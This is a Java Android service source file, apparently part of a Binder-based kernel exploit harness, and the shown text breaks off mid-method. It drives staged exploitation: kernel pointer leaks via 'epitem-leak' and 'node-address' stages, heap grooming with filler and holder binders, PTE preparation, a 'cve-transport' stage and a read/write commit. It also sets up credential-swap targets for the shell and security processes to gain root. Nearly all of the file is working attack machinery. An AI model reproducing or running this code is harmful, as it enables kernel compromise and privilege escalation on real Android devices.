package com.vandam.prism;

import android.app.Service;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.IBinder;
import android.os.Binder;
import android.os.Parcel;
import android.os.ParcelFileDescriptor;
import android.os.Process;
import android.os.RemoteException;
import android.os.SystemClock;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashSet;
import java.util.IdentityHashMap;
import java.util.List;
import java.util.Set;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.FutureTask;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

public final class HarnessService extends Service {
    private static final int COPY_SIGNAL_PORT = 47391;
    private static final int REFERENCE_HOLDER_COUNT = 64;
    private static final int RAW_BINDER_HOLDER_COUNT = 512;
    private static final int RAW_CURRENT_PROC_MARKER_HOLDERS = 8;
    private static final boolean RAW_BINDER_HOLDER_CANDIDATE = true;
    private static final boolean MIXED_DISCLOSURE_CANDIDATE = true;
    private static final int RAW_BINDER_FILLER_MIN = 20;
    private static final int RAW_BINDER_FILLER_VARIANTS = 8;
    private static final int RAW_BINDER_PRIME_REFS_PER_HOLDER = 32;
    private static final int RAW_BROKER_CALLBACK_CODE = 0x42b0;
    static final int RAW_BROKER_HOLDER_CODE = 0x42b1;
    private static final int RAW_BROKER_HOLDER_PROOF = 0x50524852;
    private static final int RAW_BROKER_ROOT_PROOF = 0x50525252;
    private static final int RAW_BROKER_PRIME_PROOF = 0x50525052;
    private static final String RAW_BROKER_CALLBACK_EXTRA =
            "raw_broker_callback";
    private static final String RAW_BROKER_HOLDER_EXTRA =
            "raw_broker_holder";
    private static final String RAW_BROKER_HOLDER_INDEX_EXTRA =
            "raw_broker_holder_index";
    private static final int RAW_BROKER_HOLDER_INDEX_SENTINEL = 0x71d3a91b;
    private static final String RAW_BROKER_VICTIM_EXTRA =
            "raw_broker_victim";
    private static final String RAW_BROKER_FOREGROUND_EXTRA =
            "raw_broker_foreground";
    private static final String RAW_BROKER_MARKER_DESCRIPTOR =
            "com.vandam.prism.RawBrokerMarker";
    static final int FILLERS_PER_PROCESS = 24;
    private static final String TAG = "LP3BinderDirect";
    private static final String CHANNEL = "lp3-binder-direct";
    private static final int RAW_VICTIM_COUNT = 19;
    private static final boolean BATCHED_TERMINAL_WRITES = false;
    private static final int TERMINAL_RETIREMENT_TIMEOUT_MS = 10000;
    private static final int TERMINAL_RETIREMENT_WORKER_TIMEOUT_MS = 15000;
    private static final int TRANSACTION_PREPARE_PRIVATE_CREDENTIAL = 0x42b5;
    private static final int TRANSACTION_PROCESS_TEARDOWN = 0x42b6;
    private static final String PRIVATE_CREDENTIAL_DESCRIPTOR =
            "com.vandam.prism.ShellBridgePrivateCredential";
    private String requestedStage = "bootstrap";
    private boolean restoreAfterAction = true;
    private boolean directInitCred = false;
    private boolean directSecurityCred = false;
    private boolean directSecurityRepair = false;
    private boolean directCredQuarantine = false;
    private boolean directTerminalCleanup = false;
    private boolean directActionAfterSecuritySwap = false;
    private boolean processTeardownSupported = false;
    private volatile boolean terminalJavaRetirementInProgress;
    private String rootWatchdogNonce = "";
    private int rootWatchdogHelperPid = -1;
    private String rootWatchdogHelperStart = "";
    private String rootWatchdogBootId = "";
    private int rootWatchdogTid = -1;
    private int ctlbufUeventdPid = -1;
    private int ctlbufDonorPid = -1;
    private String ctlbufDonorStart = "";
    private ParcelFileDescriptor ctlbufModuleFd;
    private ParcelFileDescriptor ctlbufVendorFd;
    private IBinder[] cohort;
    private long[] cohortPointers;
    private long[] cohortCookies;
    private int cohortOwnerCpu = -1;
    private volatile IBinder ownerService;
    private volatile int ownerServicePid = -1;
    private volatile ProcessIdentity ownerProcessIdentity;
    private boolean ownerConnectionBound;
    private volatile IBinder rawTargetService;
    private int rawTargetPid = -1;
    private ProcessIdentity rawTargetProcessIdentity;
    private ServiceConnection rawTargetConnection;
    private volatile IBinder rawClientService;
    private ServiceConnection rawClientConnection;
    private ProcessIdentity rawClientProcessIdentity;
    private boolean rawClientBound;
    private boolean rawClientUnbinding;
    private boolean rawClientConnectedOnce;
    private boolean rawClientRetiring;
    private boolean rawClientConnectionFailed;
    private final Object extraRawClientLock = new Object();
    private final RawClientSlot[] extraRawClientSlots =
            createExtraRawClientSlots();
    private String extraRawClientState = "status=fail stage=raw-client-extra";
    private volatile boolean rawVictimContextsActive;
    private String credentialTargetState =
            "status=fail stage=credential-target";
    private IBinder credentialTarget;
    private IBinder securityTarget;
    private String securityTargetState =
            "status=fail stage=security-target";
    private int credentialTargetPid = -1;
    private final AtomicBoolean credentialTargetDeathCallback =
            new AtomicBoolean();
    private volatile String credentialTargetDeathProof =
            "status=fail stage=credential-target-death reason=not-seen";
    private final IBinder.DeathRecipient credentialTargetDeathRecipient =
            () -> {
                if (credentialTargetDeathCallback.compareAndSet(
                        false, true)) {
                    credentialTargetDeathProof =
                            NativeBridge.recordCredentialTargetDeath(
                                    credentialTargetPid,
                                    rootWatchdogHelperStart,
                                    rootWatchdogBootId);
                }
            };
    private volatile IBinder anchorHolderService;
    private ServiceConnection anchorHolderConnection;
    private volatile int anchorHolderPid = -1;
    private volatile ProcessIdentity anchorHolderProcessIdentity;
    private int rawClientPid = -1;
    private IBinder[] rawCohortSiblings;
    private volatile boolean rwPrepared;
    private IBinder controlledNode;
    private final Binder kernelAnchor = new Binder();
    private final Binder rawCurrentProcMarker = new Binder();
    private final Binder rawBrokerMarker =
            new Binder(RAW_BROKER_MARKER_DESCRIPTOR);
    private final ExecutorService rawBrokerExecutor =
            Executors.newFixedThreadPool(8, runnable -> {
                Thread thread = new Thread(runnable, "raw-broker");
                thread.setDaemon(true);
                return thread;
            });
    private int kernelAnchorRetained;
    private int rawCurrentProcMarkerRetained;
    private IBinder[] fillerNodes;
    private IBinder[] rawBinderPrimeNodes;
    private Parcel rawControlledNodeParcel;
    private long controlledPointer;
    private long controlledCookie;
    private long rawControlledPointer;
    private long rawControlledCookie;
    private String chainControlledState;
    private String chainAddressPrefix;
    private volatile boolean chainSecondOwner;
    private boolean chainEpitemBound;
    private volatile boolean kernelMutationStarted;
    private volatile boolean processTeardownRequired;
    private String processTeardownSignal = "not-requested";
    private final List<ServiceConnection> isolatedConnections =
            new ArrayList<>();
    private final List<RawBinderHolderEndpoint> rawBinderHolderEndpoints =
            new ArrayList<>();
    private volatile boolean rawBinderHoldersActive;
    private volatile String rawBinderHolderBootstrapState =
            "status=fail stage=raw-binder-holder-bootstrap reason=not-run";
    private final Set<Integer> isolatedPids = new HashSet<>();
    private volatile List<IsolatedControllerPair> isolatedControllerPairs =
            Collections.emptyList();
    private long isolatedRetirementGeneration;
    private volatile String terminalJavaRetirementStage = "not-started";
    private final AtomicBoolean commitRunning = new AtomicBoolean();

    private static final class IsolatedControllerPair {
        final IBinder controller;
        final int pid;
        long deathBarrier;

        IsolatedControllerPair(IBinder controller, int pid,
                               long deathBarrier) {
            this.controller = controller;
            this.pid = pid;
            this.deathBarrier = deathBarrier;
        }
    }

    private static final class RawBinderHolderEndpoint {
        final IBinder callback;
        long deathBarrier;

        RawBinderHolderEndpoint(IBinder callback, long deathBarrier) {
            this.callback = callback;
            this.deathBarrier = deathBarrier;
        }
    }

    private enum RawClientSlotState {
        EMPTY,
        ACTIVE,
        RETIRING,
        CONSUMED,
        FAILED
    }

    private static final class RawClientSlot {
        final int index;
        final Class<?> serviceClass;
        ServiceConnection connection;
        IBinder service;
        ProcessIdentity identity;
        int pid = -1;
        long pointer;
        long cookie;
        long deathBarrier;
        boolean bound;
        boolean unbinding;
        boolean connectedOnce;
        RawClientSlotState state = RawClientSlotState.EMPTY;

        RawClientSlot(int index, Class<?> serviceClass) {
            this.index = index;
            this.serviceClass = serviceClass;
        }
    }

    private static RawClientSlot[] createExtraRawClientSlots() {
        Class<?>[] classes = {
                RawBClient1Service.class, RawBClient2Service.class,
                RawBClient3Service.class, RawBClient4Service.class,
                RawBClient5Service.class, RawBClient6Service.class,
                RawBClient7Service.class, RawBClient8Service.class,
                RawBClient9Service.class, RawBClient10Service.class,
                RawBClient11Service.class, RawBClient12Service.class,
                RawBClient13Service.class, RawBClient14Service.class,
                RawBClient15Service.class, RawBClient16Service.class,
                RawBClient17Service.class, RawBClient18Service.class
        };
        RawClientSlot[] slots = new RawClientSlot[classes.length];
        for (int index = 0; index < classes.length; index++) {
            slots[index] = new RawClientSlot(index, classes[index]);
        }
        return slots;
    }

    private static boolean isRootFlow(String stage) {
        return "root-chain".equals(stage) ||
                "primitive-probe".equals(stage);
    }

    private boolean isRootFlow() {
        return isRootFlow(requestedStage);
    }

    private boolean useMixedDisclosure() {
        return MIXED_DISCLOSURE_CANDIDATE &&
                ("chain-addresses".equals(requestedStage) || isRootFlow());
    }

    private final ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            ownerService = service;
            ownerProcessIdentity = queryServiceIdentity(service,
                    OwnerService.TRANSACTION_IDENTITY);
            ownerServicePid = ownerProcessIdentity == null
                    ? -1 : ownerProcessIdentity.pid;
            String stage = requestedStage;
            if ("epitem-leak".equals(stage) ||
                    (("chain-addresses".equals(stage) ||
                      isRootFlow(stage)) &&
                            !chainSecondOwner)) {
                String handleState = NativeBridge.cacheOwnerHandleForBinder(
                        service, OwnerService.DESCRIPTOR);
                if (!handleState.startsWith("status=pass")) {
                    publish("status=fail stage=epitem-leak handle=[" +
                            handleState + "]");
                    finishEpitemLeak();
                    return;
                }
                new Thread(() -> runEpitemLeak(handleState),
                        "epitem-leak-controller").start();
                return;
            }
            if ("node-address".equals(stage) ||
                    "fake-node-check".equals(stage)) {
                String handleState = NativeBridge.cacheOwnerHandleForBinder(
                        service, OwnerService.DESCRIPTOR);
                if (!handleState.startsWith("status=pass") ||
                        !fetchControlledNode(service) ||
                        !fetchFillerNodes(service)) {
                    publish("status=fail stage=node-address handle=[" +
                            handleState + "] controlled=" +
                            (controlledNode != null ? 1 : 0));
                    finishEpitemLeak();
                    return;
                }
                String controlledState = NativeBridge.cacheControlledHandle(
                        controlledNode);
                if (!controlledState.startsWith("status=pass")) {
                    publish("status=fail stage=" + stage +
                            " controlled_handle=[" + controlledState + "]");
                    finishEpitemLeak();
                    return;
                }
                boolean fakeCheck = "fake-node-check".equals(stage);
                new Thread(() -> runNodeAddress(
                        handleState + " " + controlledState, fakeCheck),
                        "node-address-controller").start();
                return;
            }
            String result;
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                if (!service.transact(OwnerService.TRANSACTION_TOKENS,
                                      data, reply, 0)) {
                    result = "status=fail stage=bootstrap reason=token-transaction";
                } else {
                    reply.readException();
                    long pointer = reply.readLong();
                    long cookie = reply.readLong();
                    if ("rw-probe".equals(stage)) {
                        String cohortState = fetchAndValidateCohort(service);
                        String pteState = cohortState.startsWith("status=pass")
                                ? transactForString(service,
                                        OwnerService.TRANSACTION_PREPARE_PTES)
                                : "status=fail stage=pte-prepare reason=cohort";
                        String queueState = pteState.startsWith("status=pass")
                                ? NativeBridge.adoptAndQueueCohort(
                                        cohort, cohortPointers, cohortCookies,
                                        cohortOwnerCpu)
                                : "status=fail stage=stale-prepare reason=pte";
                        int entered = queueState.startsWith("status=pass")
                                ? readSelectedHeld(service) : 0;
                        rwPrepared = cohortState.startsWith("status=pass") &&
                                pteState.startsWith("status=pass") &&
                                queueState.startsWith("status=pass") &&
                                entered == 1;
                        result = "status=" + (rwPrepared ? "ready" : "fail") +
                                " stage=rw-probe selected_entered=" + entered +
                                " commit_required=1 cohort=[" + cohortState +
                                "] pte=[" + pteState + "] queue=[" +
                                queueState + "]";
                    } else if ("stale-prepare".equals(stage)) {
                        String cohortState = fetchAndValidateCohort(service);
                        if (!cohortState.startsWith("status=pass")) {
                            result = cohortState;
                        } else {
                            String queueState = NativeBridge.adoptAndQueueCohort(
                                    cohort, cohortPointers, cohortCookies,
                                    cohortOwnerCpu);
                            int entered = readSelectedHeld(service);
                            result = queueState + " selected_entered=" + entered;
                        }
                    } else if ("cohort".equals(requestedStage)) {
                        result = fetchAndValidateCohort(service);
                    } else if ("cve-transport".equals(requestedStage)) {
                        int held = queueHeldTransaction(service);
                        result = held == 1
                                ? NativeBridge.cveTransport(pointer, cookie)
                                : "status=fail stage=cve-transport reason=hold"
                                        + " held=" + held;
                    } else {
                        result = NativeBridge.bootstrap(pointer, cookie);
                    }
                }
            } catch (Exception exception) {
                result = "status=fail stage=bootstrap reason=exception type=" +
                        exception.getClass().getSimpleName();
            } finally {
                reply.recycle();
                data.recycle();
            }
            publish(result);
            if (!"rw-probe".equals(stage) || !rwPrepared) {
                unbindService(this);
                ownerConnectionBound = false;
                ownerService = null;
                ownerServicePid = -1;
                stopForeground(true);
                stopSelf();
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            publish("status=fail stage=bootstrap reason=owner-disconnected");
            if (kernelMutationStarted) {
                checkpoint(isRootFlow()
                        ? "root-window-reboot-required"
                        : "primitive-reboot-required");
                return;
            }
            finishEpitemLeak();
            stopSelf();
        }
    };

    private final ServiceConnection chainEpitemConnection =
            new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            ownerService = service;
            ownerProcessIdentity = queryServiceIdentity(service,
                    OwnerService.TRANSACTION_IDENTITY);
            ownerServicePid = ownerProcessIdentity == null
                    ? -1 : ownerProcessIdentity.pid;
            String handleState = NativeBridge.cacheOwnerHandleForBinder(
                    service, OwnerService2.DESCRIPTOR);
            if (!handleState.startsWith("status=pass") ||
                    !fetchControlledNode(service) ||
                    !fetchFillerNodes(service)) {
                publish("status=fail stage=chain-addresses " +
                        chainAddressPrefix + "reason=node-owner handle=[" +
                        handleState + "]");
                finishEpitemLeak();
                return;
            }
            chainControlledState = NativeBridge.cacheControlledHandle(
                    controlledNode);
            if (!chainControlledState.startsWith("status=pass")) {
                publish("status=fail stage=chain-addresses " +
                        chainAddressPrefix + "controlled=[" +
                        chainControlledState + "]");
                finishEpitemLeak();
                return;
            }
            new Thread(() -> runNodeAddress(chainAddressPrefix +
                    "controlled=[" + chainControlledState + "]",
                    isRootFlow()),
                    "node-address-controller").start();
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            if (terminalJavaRetirementInProgress) {
                return;
            }
            publish("status=fail stage=chain-addresses " +
                    chainAddressPrefix + "reason=node-owner-disconnected");
            finishEpitemLeak();
        }
    };

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String incomingStage = intent == null
                ? "bootstrap" : intent.getStringExtra("stage");
        if (incomingStage == null) {
            incomingStage = "bootstrap";
        }
        if ("raw-binder-broker".equals(incomingStage)) {
            boolean foreground = intent.getBooleanExtra(
                    RAW_BROKER_FOREGROUND_EXTRA, false);
            if (foreground) {
                NotificationManager manager =
                        getSystemService(NotificationManager.class);
                manager.createNotificationChannel(new NotificationChannel(
                        CHANNEL, "LP3 Binder Direct",
                        NotificationManager.IMPORTANCE_LOW));
                Notification notification = new Notification.Builder(
                        this, CHANNEL)
                        .setSmallIcon(android.R.drawable.stat_sys_warning)
                        .setContentTitle("LP3 Binder Direct")
                        .setContentText("Running a bounded Binder stage")
                        .setOngoing(true)
                        .build();
                startForeground(1, notification);
            }
            IBinder callback = intent.getExtras() == null ? null :
                    intent.getExtras().getBinder(RAW_BROKER_CALLBACK_EXTRA);
            boolean holder = intent.getBooleanExtra(
                    RAW_BROKER_HOLDER_EXTRA, false);
            int holderIndex = intent.getIntExtra(
                    RAW_BROKER_HOLDER_INDEX_EXTRA, -1);
            boolean victim = intent.getBooleanExtra(
                    RAW_BROKER_VICTIM_EXTRA, false);
            IBinder victimTarget = victim ? rawTargetService : null;
            Runnable response = () -> sendRawBrokerResponse(
                    callback, holder, holderIndex, victim, victimTarget);
            if (holder && !foreground && !victim) {
                rawBrokerExecutor.execute(response);
            } else {
                response.run();
            }
            if (foreground && !holder) {
                stopForeground(true);
                stopSelf(startId);
            }
            return START_NOT_STICKY;
        }
        requestedStage = incomingStage;
        restoreAfterAction = intent == null ||
                intent.getBooleanExtra("restore-after-action", true);
        directInitCred = intent != null &&
                intent.getBooleanExtra("direct-init-cred", false);
        directSecurityCred = intent != null &&
                intent.getBooleanExtra("direct-security-cred", false);
        directSecurityRepair = intent != null &&
                intent.getBooleanExtra("direct-security-repair", false);
        directCredQuarantine = intent != null &&
                intent.getBooleanExtra("direct-cred-quarantine", false);
        directTerminalCleanup = intent != null &&
                intent.getBooleanExtra("direct-terminal-cleanup", false);
        directActionAfterSecuritySwap = intent != null &&
                intent.getBooleanExtra(
                        "direct-action-after-security-swap", false);
        processTeardownSupported = intent != null &&
                intent.getBooleanExtra(
                        "process-teardown-supported", false);
        rootWatchdogNonce = intent == null ? "" :
                intent.getStringExtra("root-watchdog-nonce");
        rootWatchdogHelperPid = parsePositiveInt(intent == null ? "" :
                intent.getStringExtra("root-watchdog-helper-pid"));
        rootWatchdogHelperStart = intent == null ? "" :
                intent.getStringExtra("root-watchdog-helper-start");
        rootWatchdogBootId = intent == null ? "" :
                intent.getStringExtra("root-watchdog-boot-id");
        ctlbufUeventdPid = parsePositiveInt(intent == null ? "" :
                intent.getStringExtra("ctlbuf-ueventd-pid"));
        ctlbufDonorPid = parsePositiveInt(intent == null ? "" :
                intent.getStringExtra("ctlbuf-donor-pid"));
        ctlbufDonorStart = intent == null ? "" :
                intent.getStringExtra("ctlbuf-donor-start");
        if (rootWatchdogNonce == null) {
            rootWatchdogNonce = "";
        }
        if (rootWatchdogHelperStart == null) {
            rootWatchdogHelperStart = "";
        }
        if (rootWatchdogBootId == null) {
            rootWatchdogBootId = "";
        }
        if (ctlbufDonorStart == null) {
            ctlbufDonorStart = "";
        }
        NotificationManager manager = getSystemService(NotificationManager.class);
        manager.createNotificationChannel(new NotificationChannel(
                CHANNEL, "LP3 Binder Direct",
                NotificationManager.IMPORTANCE_LOW));
        Notification notification = new Notification.Builder(this, CHANNEL)
                .setSmallIcon(android.R.drawable.stat_sys_warning)
                .setContentTitle("LP3 Binder Direct")
                .setContentText("Running a bounded Binder stage")
                .setOngoing(true)
                .build();
        startForeground(1, notification);

        File result = new File(getFilesDir(), "direct.result");
        if (result.exists() && !result.delete()) {
            publish("status=fail stage=bootstrap reason=old-result");
            return START_NOT_STICKY;
        }
        if ("preflight".equals(requestedStage)) {
            publish(DeviceGate.verify(this));
            stopForeground(true);
            stopSelf(startId);
            return START_NOT_STICKY;
        }
        if ("parcel-probe".equals(requestedStage)) {
            Parcel parcel = Parcel.obtain();
            try {
                Binder marker = new Binder();
                parcel.writeInt(0x50524953);
                parcel.writeStrongBinder(marker);
                parcel.writeString("prism-parcel-probe");
                publish(NativeBridge.inspectParcel(parcel));
            } finally {
                parcel.recycle();
            }
            stopForeground(true);
            stopSelf(startId);
            return START_NOT_STICKY;
        }
        if ("raw-binder-template".equals(requestedStage)) {
            Parcel serviceManager = Parcel.obtain();
            Parcel startService = Parcel.obtain();
            try {
                Binder callback = new Binder();
                serviceManager.writeInterfaceToken(
                        "android.os.IServiceManager");
                serviceManager.writeString("activity");
                Intent broker = new Intent(this, HarnessService.class);
                broker.putExtra("stage", "raw-binder-broker");
                android.os.Bundle extras = broker.getExtras();
                if (extras == null) {
                    extras = new android.os.Bundle();
                }
                extras.putBinder(RAW_BROKER_CALLBACK_EXTRA, callback);
                extras.putBoolean(RAW_BROKER_HOLDER_EXTRA, false);
                extras.putBoolean(RAW_BROKER_FOREGROUND_EXTRA, true);
                broker.replaceExtras(extras);
                startService.writeInterfaceToken(
                        "android.app.IActivityManager");
                startService.writeStrongBinder(null);
                startService.writeTypedObject(broker, 0);
                startService.writeString(null);
                startService.writeBoolean(true);
                startService.writeString(getPackageName());
                startService.writeString(null);
                startService.writeInt(Process.myUid() / 100000);
                String service = NativeBridge.exportParcelTemplate(
                        serviceManager,
                        new File(getFilesDir(),
                                "raw-route-service.template").getPath());
                String start = NativeBridge.exportParcelTemplate(
                        startService,
                        new File(getFilesDir(),
                                "raw-route-start.template").getPath());
                publish("status=" +
                        (service.startsWith("status=pass") &&
                         start.startsWith("status=pass") ? "pass" : "fail") +
                        " stage=raw-binder-template service=[" + service +
                        "] start=[" + start + "]");
            } finally {
                startService.recycle();
                serviceManager.recycle();
            }
            stopForeground(true);
            stopSelf(startId);
            return START_NOT_STICKY;
        }
        if ("raw-binder-route-probe".equals(requestedStage)) {
            int routeCount = intent == null ? 1 :
                    intent.getIntExtra("count", 1);
            if (routeCount < 1 || routeCount > REFERENCE_HOLDER_COUNT) {
                publish("status=fail stage=raw-binder-route" +
                        " reason=count requested=" + routeCount);
                stopForeground(true);
                stopSelf(startId);
                return START_NOT_STICKY;
            }
            Parcel serviceManager = Parcel.obtain();
            Parcel startService = Parcel.obtain();
            Binder callbackMarker = new Binder();
            serviceManager.writeInterfaceToken("android.os.IServiceManager");
            serviceManager.writeString("activity");

            Intent broker = new Intent(this, HarnessService.class);
            broker.putExtra("stage", "raw-binder-broker");
            android.os.Bundle brokerExtras = broker.getExtras();
            if (brokerExtras == null) {
                brokerExtras = new android.os.Bundle();
            }
            brokerExtras.putBinder(RAW_BROKER_CALLBACK_EXTRA,
                    callbackMarker);
            broker.replaceExtras(brokerExtras);
            startService.writeInterfaceToken("android.app.IActivityManager");
            startService.writeStrongBinder(null);
            startService.writeTypedObject(broker, 0);
            startService.writeString(null);
            startService.writeBoolean(false);
            startService.writeString(getPackageName());
            startService.writeString(null);
            startService.writeInt(Process.myUid() / 100000);
            long[] callbackTokens = NativeBridge.ownerTokens(callbackMarker);
            new Thread(() -> {
                String probe = "status=fail stage=raw-binder-route" +
                        " reason=not-run";
                int passed = 0;
                long routeStarted = SystemClock.elapsedRealtimeNanos();
                try {
                    for (; callbackMarker.isBinderAlive() &&
                            passed < routeCount; passed++) {
                        probe = NativeBridge.rawBinderRouteProbe(
                                    serviceManager, startService,
                                    callbackTokens[0], callbackTokens[1],
                                    routeCount > 1);
                        if (!probe.startsWith("status=pass")) {
                            break;
                        }
                    }
                } finally {
                    startService.recycle();
                    serviceManager.recycle();
                }
                String release = routeCount > 1
                        ? NativeBridge.releaseRawBinderRouteProbes()
                        : "status=pass stage=raw-binder-route-release" +
                                " released=0";
                long durationMicros = (SystemClock.elapsedRealtimeNanos() -
                        routeStarted) / 1000;
                boolean complete = passed == routeCount &&
                        probe.startsWith("status=pass") &&
                        release.startsWith("status=pass");
                publish("status=" + (complete ? "pass" : "fail") +
                        " stage=raw-binder-route-series requested=" +
                        routeCount + " passed=" + passed +
                        " duration_us=" + durationMicros + " last=[" +
                        probe + "] release=[" + release + "]");
                stopForeground(true);
                stopSelf(startId);
            }, "raw-binder-route-probe").start();
            return START_NOT_STICKY;
        }
        if ("epitem-leak".equals(requestedStage) ||
                "chain-addresses".equals(requestedStage) ||
                isRootFlow() ||
                "node-address".equals(requestedStage) ||
                "fake-node-check".equals(requestedStage)) {
            clearEpitemLeakFiles();
        }
        if ("register-shell".equals(requestedStage)) {
            credentialTargetDeathCallback.set(false);
            credentialTargetDeathProof =
                    "status=fail stage=credential-target-death reason=not-seen";
            credentialTarget = intent == null ||
                    intent.getExtras() == null ? null :
                    intent.getExtras().getBinder("shell_target");
            credentialTargetPid = intent == null ? -1 :
                    intent.getIntExtra("shell_pid", -1);
            credentialTargetState = credentialTarget == null
                    ? "status=fail stage=credential-target reason=missing"
                    : NativeBridge.cacheCredentialTarget(
                            credentialTarget, credentialTargetPid,
                            Process.SHELL_UID, Process.SHELL_UID);
            if (credentialTarget != null &&
                    credentialTargetState.startsWith("status=pass")) {
                try {
                    credentialTarget.linkToDeath(
                            credentialTargetDeathRecipient, 0);
                } catch (RemoteException exception) {
                    credentialTargetState =
                            "status=fail stage=credential-target " +
                            "reason=death-link";
                }
            }
            securityTarget = intent == null ||
                    intent.getExtras() == null ? null :
                    intent.getExtras().getBinder("security_target");
            int securityPid = intent == null ? -1 :
                    intent.getIntExtra("security_pid", -1);
            boolean securityPidOnly = intent != null &&
                    intent.getBooleanExtra("security_pid_only", false);
            securityTargetState = securityPidOnly
                    ? NativeBridge.cacheSecurityTargetPid(securityPid)
                    : securityTarget == null
                            ? "status=fail stage=security-target reason=missing"
                            : NativeBridge.cacheSecurityTarget(
                                    securityTarget, securityPid);
            Log.i(TAG, credentialTargetState);
            Log.i(TAG, securityTargetState);
            return START_NOT_STICKY;
        }
        if (isRootFlow()) {
            kernelMutationStarted = false;
            processTeardownRequired = false;
            processTeardownSignal = "not-requested";
            closeParcelFileDescriptor(ctlbufModuleFd);
            closeParcelFileDescriptor(ctlbufVendorFd);
            ctlbufModuleFd = null;
            ctlbufVendorFd = null;
            File progress = new File(getFilesDir(), "chain.progress");
            if (progress.exists()) {
                progress.delete();
            }
            checkpoint("root-flow-start");
            isolatedRetirementGeneration =
                    NativeBridge.startIsolatedRetirementProof();
            discardIsolatedDeathBarriers();
            synchronized (isolatedPids) {
                isolatedPids.clear();
            }
            if (isolatedRetirementGeneration <= 0) {
                publish("status=fail stage=isolated-retirement-start");
                stopSelf(startId);
                return START_NOT_STICKY;
            }
            String deviceGate = DeviceGate.verify(this);
            if (!deviceGate.startsWith("status=pass")) {
                publish(deviceGate);
                stopSelf(startId);
                return START_NOT_STICKY;
            }
            Log.i(TAG, deviceGate);
            checkpoint("device-gate-pass");
            if (credentialTarget == null || credentialTargetPid <= 0 ||
                    !credentialTargetState.startsWith("status=pass")) {
                credentialTargetState =
                        "status=fail stage=credential-target reason=missing";
            }
            if (!credentialTargetState.startsWith("status=pass")) {
                publish(credentialTargetState);
                stopSelf(startId);
                return START_NOT_STICKY;
            }
            if (!securityTargetState.startsWith("status=pass")) {
                publish(securityTargetState);
                stopSelf(startId);
                return START_NOT_STICKY;
            }
        }
        if ("rw-commit".equals(requestedStage)) {
            if (!rwPrepared || ownerService == null ||
                    !commitRunning.compareAndSet(false, true)) {
                publish("status=fail stage=rw-commit reason=not-ready");
            } else {
                new Thread(this::commitRwProbe, "rw-commit").start();
            }
            return START_NOT_STICKY;
        }
        if ("epitem-leak".equals(requestedStage) ||
                "chain-addresses".equals(requestedStage) || isRootFlow()) {
            startService(new Intent(this, FirstClientWarmService.class));
        }
        Intent owner = new Intent(this, OwnerService.class);
        ownerConnectionBound = bindService(
                owner, connection, Context.BIND_AUTO_CREATE);
        if (!ownerConnectionBound) {
            publish("status=fail stage=bootstrap reason=bind-owner");
            stopSelf(startId);
        }
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void sendRawBrokerResponse(IBinder callback, boolean holder,
            int holderIndex, boolean victim, IBinder victimTarget) {
        boolean endpointReady = callback != null &&
                (!victim || victimTarget != null);
        if (endpointReady && holder) {
            long barrier = NativeBridge.armBinderDeathBarrier(callback);
            synchronized (rawBinderHolderEndpoints) {
                endpointReady = barrier != 0 && holderIndex >= 0 &&
                        holderIndex < RAW_BINDER_HOLDER_COUNT &&
                        rawBinderHolderEndpoints.size() ==
                                RAW_BINDER_HOLDER_COUNT &&
                        rawBinderHolderEndpoints.get(holderIndex) == null;
                if (endpointReady) {
                    rawBinderHolderEndpoints.set(holderIndex,
                            new RawBinderHolderEndpoint(callback, barrier));
                } else if (barrier != 0) {
                    NativeBridge.discardBinderDeathBarrier(barrier);
                }
            }
        }
        Parcel response = Parcel.obtain();
        try {
            response.writeInt(0x50524252);
            response.writeStrongBinder(rawBrokerMarker);
            if (victim) {
                response.writeStrongBinder(victimTarget);
            }
            if (endpointReady) {
                callback.transact(RAW_BROKER_CALLBACK_CODE, response, null,
                        IBinder.FLAG_ONEWAY);
            }
        } catch (RemoteException exception) {
            Log.e(TAG, "raw-binder-broker", exception);
        } finally {
            response.recycle();
        }
    }

    private void publish(String result) {
        try {
            writePrivateAtomic("direct.result", result);
        } catch (Exception exception) {
            Log.e(TAG, "result-write", exception);
        }
    }

    private void checkpoint(String name) {
        try {
            requiredCheckpoint(name);
        } catch (IOException exception) {
            Log.e(TAG, "checkpoint", exception);
        }
    }

    private String safeCheckpointToken(String value) {
        if (value == null || value.isEmpty()) {
            return "none";
        }
        StringBuilder token = new StringBuilder();
        for (int index = 0; index < value.length() && token.length() < 160;
             index++) {
            char character = value.charAt(index);
            if ((character >= 'a' && character <= 'z') ||
                    (character >= 'A' && character <= 'Z') ||
                    (character >= '0' && character <= '9') ||
                    character == '_' || character == '-' || character == '.') {
                token.append(character);
            } else {
                token.append('_');
            }
        }
        return token.length() == 0 ? "none" : token.toString();
    }

    private void requiredCheckpoint(String name) throws IOException {
        File output = new File(getFilesDir(), "chain.progress");
        String value = SystemClock.elapsedRealtime() + " " + name + "\n";
        try (FileOutputStream stream = new FileOutputStream(output, true)) {
            stream.write(value.getBytes(StandardCharsets.UTF_8));
            stream.getFD().sync();
        }
    }

    private int queueHeldTransaction(IBinder service) throws Exception {
        Parcel hold = Parcel.obtain();
        try {
            if (!service.transact(OwnerService.TRANSACTION_HOLD, hold, null,
                                  IBinder.FLAG_ONEWAY)) {
                return 0;
            }
        } finally {
            hold.recycle();
        }

        for (int attempt = 0; attempt < 100; attempt++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
